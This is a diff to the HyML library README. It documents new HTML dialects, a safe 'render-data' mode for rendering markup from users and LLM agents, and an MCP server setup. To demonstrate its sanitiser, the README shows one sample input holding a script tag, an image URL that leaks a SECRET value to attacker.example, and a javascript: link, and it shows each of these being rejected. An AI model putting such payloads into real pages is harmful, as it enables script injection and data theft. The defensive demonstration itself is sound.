@@ -402,7 +402,7 @@ So is this it, the code generation at its best? With 35 characters of code we ma
 
 **From Python**
 
-HyML can be used from plain Python too. ``hyml.render`` takes HyML source text, a dialect (``ml``, ``xml``, ``xhtml``, ``xhtml5``, ``html4``, or ``html5``) and an optional dictionary of variables for unquoted code:
+HyML can be used from plain Python too. ``hyml.render`` takes HyML source text, a dialect (``ml``, ``xml``, ``xhtml``, ``xhtml5``, ``html4``, ``html5``, ``html4-min``, or ``html5-min``) and an optional dictionary of variables for unquoted code:
 
 .. code-block:: python
 
@@ -427,6 +427,72 @@ The Jupyter Notebook documents in the repository run on the standard Python 3 ke
     (html5 (p "Hello"))
 
 The value of the last form is the output of the cell, and macros required in one cell are available in the later ones. Start Jupyter in the repository directory, because the example templates are read relative to it.
+
+
+**Markup from users and LLM agents**
+
+The ``ML`` macros and ``hyml.render`` evaluate the code in ``~`` and ``~@``, so they
+must never get input you don't trust. For markup from users or LLM agents use
+``render-data`` (``hyml.render_data`` in Python). It takes s-expression text, JSON
+Hiccup lists (``["p", {"class": "x"}, "Hello"]``) or quoted Hy, and never evaluates
+anything. Text and attribute values are escaped:
+
+.. code:: lisp
+
+    (import hyml [render-data validate-data])
+    (print (render-data "(ul :class \"todo\" (li \"one\") (li \"<b>two</b>\"))"))
+    (print (render-data ["p" {"class" "note"} "Hello " ["b" "world"]]))
+
+Output:
+
+.. parsed-literal::
+
+    <ul class=todo><li>one<li>&lt;b&gt;two&lt;/b&gt;</ul>
+    <p class=note>Hello <b>world</b></p>
+
+In safe mode, the default, markup that can run scripts or leak data is refused.
+Every problem is listed with its path, so that an agent can fix its markup in one
+round. ``render-data`` raises ``HyMLDataError`` with these, and ``validate-data``
+returns them:
+
+.. code:: lisp
+
+    (for [problem (validate-data "(div (script \"steal()\") (img :src \"https://attacker.example/x?d=SECRET\") (a :href \"javascript:alert(1)\" \"x\"))")]
+      (print problem))
+
+Output:
+
+.. parsed-literal::
+
+    div > script[1]: <script> is not allowed in safe mode, because it can run scripts or load content
+    div > img[2]: src='https://attacker.example/x?d=SECRET' loads an external resource without a click, which can leak data. Use a relative URL, or allow the host with allowed_url_hosts
+    div > a[3]: href='javascript:alert(1)' uses the javascript: scheme. Use http, https, mailto, tel or a relative URL
+
+Safe mode rejects scripts, styles, iframes and other active elements, ``on*``
+event handlers, ``style``, URL schemes other than http, https, mailto and tel,
+external URLs that load without a click (images, media), and forms that post to
+other hosts. Options: ``allowed_tags``, ``allowed_attributes`` (names or patterns
+such as ``data-*``), ``allowed_url_hosts``, ``allow_external_resources``,
+``safe``, ``max_depth`` and ``max_nodes``. Tags and attributes that you list
+explicitly are allowed even when safe mode would block them.
+
+**MCP server for agents**
+
+``pip install "hyml[mcp]"`` installs ``hyml-mcp``, an MCP server with one tool,
+``render_html``. Agents write markup as data and get back HTML, or the list of
+problems to fix. With ``HYML_OUTPUT_DIR`` set, ``save_as`` writes the page to that
+directory and only a short confirmation goes back to the model. Other settings
+are ``HYML_DIALECT``, ``HYML_ALLOWED_TAGS``, ``HYML_ALLOWED_URL_HOSTS``,
+``HYML_EXTERNAL_RESOURCES=1`` and ``HYML_UNSAFE=1``. For Claude Code:
+
+.. code-block:: json
+
+    {"mcpServers": {"hyml": {"command": "hyml-mcp", "env": {"HYML_OUTPUT_DIR": "pages"}}}}
+
+The research behind the data mode, a security comparison with nh3 and justhtml,
+speed measurements and a field test with Claude agents are in
+`doc/background.md <https://github.com/markomanninen/hyml/blob/master/doc/background.md>`__
+and `doc/performance.md <https://github.com/markomanninen/hyml/blob/master/doc/performance.md>`__.
 
 
 Documentation
